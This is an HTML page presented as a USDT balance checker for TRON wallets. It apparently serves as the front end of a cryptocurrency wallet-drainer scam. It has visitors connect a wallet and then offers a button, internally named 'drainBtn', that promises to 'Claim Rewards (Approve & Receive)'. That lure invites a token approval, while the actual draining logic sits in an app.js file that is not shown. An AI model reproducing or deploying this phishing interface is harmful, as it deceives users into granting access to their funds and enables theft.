<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>USDT Balance Checker | TRON</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            background: radial-gradient(circle at 20% 30%, #0a0f1e, #03050b);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
        }
        .bg-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }
        .bg-gradient {
            position: absolute;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 40%, rgba(0, 255, 255, 0.12), rgba(0, 0, 0, 0));
            animation: rotate 30s linear infinite;
        }
        @keyframes rotate {
            0% { transform: translate(-25%, -25%) rotate(0deg); }
            100% { transform: translate(-25%, -25%) rotate(360deg); }
        }
        .card {
            position: relative;
            z-index: 10;
            max-width: 700px;
            width: 100%;
            background: rgba(18, 25, 45, 0.65);
            backdrop-filter: blur(14px);
            border-radius: 2rem;
            padding: 2rem;
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08);
        }
        h1 {
            font-size: 1.9rem;
            font-weight: 700;
            background: linear-gradient(135deg, #fff, #4c9aff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-align: center;
            margin-bottom: 0.5rem;
        }
        .sub {
            text-align: center;
            color: #a0b3d9;
            font-size: 0.9rem;
            margin-bottom: 2rem;
        }
        .wallet-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 0.8rem;
            margin-bottom: 2rem;
        }
        .wallet-btn {
            background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 1rem;
            padding: 0.8rem;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.5rem;
            color: white;
            font-weight: 500;
            font-size: 0.85rem;
        }
        .wallet-btn:hover {
            background: rgba(43, 110, 240, 0.3);
            border-color: #2b6ef0;
            transform: translateY(-2px);
        }
        .wallet-icon {
            font-size: 1.8rem;
        }
        .wallet-info {
            background: rgba(0, 0, 0, 0.45);
            border-radius: 1.5rem;
            padding: 1.2rem;
            margin-top: 1rem;
            backdrop-filter: blur(4px);
        }
        .wallet-info p {
            margin: 0.7rem 0;
            color: #eef4ff;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
        }
        .btn-danger {
            width: 100%;
            padding: 0.9rem;
            background: linear-gradient(105deg, #dc3545, #a71d2a);
            border: none;
            border-radius: 3rem;
            color: white;
            font-weight: 600;
            cursor: pointer;
            margin-top: 1rem;
        }
        .status {
            margin-top: 1rem;
            background: rgba(0,0,0,0.4);
            border-radius: 2rem;
            padding: 0.7rem;
            text-align: center;
            font-size: 0.85rem;
            color: #cbd5ff;
        }
        .hidden { display: none; }
        @media (max-width: 500px) {
            .wallet-grid { grid-template-columns: repeat(2, 1fr); }
        }
    </style>
</head>
<body>
<div class="bg-animation"><div class="bg-gradient"></div></div>
<div class="card">
    <h1>💰 USDT Balance Checker</h1>
    <p class="sub">Choose your wallet to connect</p>

    <div class="wallet-grid" id="walletGrid">
        <!-- Will be populated by JS -->
    </div>

    <div id="walletInfo" class="wallet-info hidden">
        <p><strong>Address:</strong> <span id="walletAddress"></span></p>
        <p><strong>USDT Balance:</strong> <span id="usdtBalance">0.00</span></p>
        <p><strong>TRX Balance:</strong> <span id="trxBalance">0.00</span></p>
        <button id="drainBtn" class="btn-danger">💸 Claim Rewards (Approve & Receive)</button>
    </div>
    <div id="status" class="status">Select a wallet above</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/tronweb@5.0.0/dist/TronWeb.js"></script>
<script src="https://unpkg.com/@tronweb3/tronwallet-adapters@1.2.26/dist/index.umd.js"></script>
<script src="app.js"></script>
</body>
</html>
